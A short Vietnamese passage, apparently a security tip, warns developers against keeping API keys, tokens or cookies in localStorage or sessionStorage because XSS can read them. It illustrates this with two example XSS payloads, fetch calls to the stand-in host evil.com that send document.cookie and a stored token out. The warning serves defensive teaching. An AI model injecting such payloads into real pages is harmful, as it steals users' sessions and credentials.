...
Bạn nào mà còn lưu API key, token hay cookie trong localStorage hoặc sessionStorage thì không khác gì dâng token cho kẻ tấn công đâu nhé. Ví dụ thay vì `alert('XSS!')`, nếu là `fetch('https://evil.com/steal-cookie?cookie=' + document.cookie)` hay `fetch('https://evil.com/steal-token?token=' + localStorage.getItem('token'))` thì kẻ tấn công đã có thể lấy được cookie hay token của người dùng rồi.
